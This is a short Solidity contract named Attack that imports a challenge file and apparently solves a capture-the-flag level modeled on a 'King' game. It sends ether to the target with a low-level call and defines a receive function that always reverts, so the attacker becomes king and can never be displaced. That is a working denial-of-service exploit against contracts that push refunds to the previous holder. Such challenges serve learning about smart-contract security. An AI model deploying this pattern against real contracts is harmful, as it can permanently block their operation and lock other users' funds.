// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
import './chall.sol';

contract Attack {

  address payable public king;

  constructor(address payable _king) public {
    king = _king;
  }

  function attack() payable public {
    (bool sent, bytes memory data) = king.call{value: msg.value}(""); // Must be "call", not "transfer" // transfer => gas Error
    require(sent, "'CALL' failed");
  }
  
  receive() external payable {
    revert();
  }

}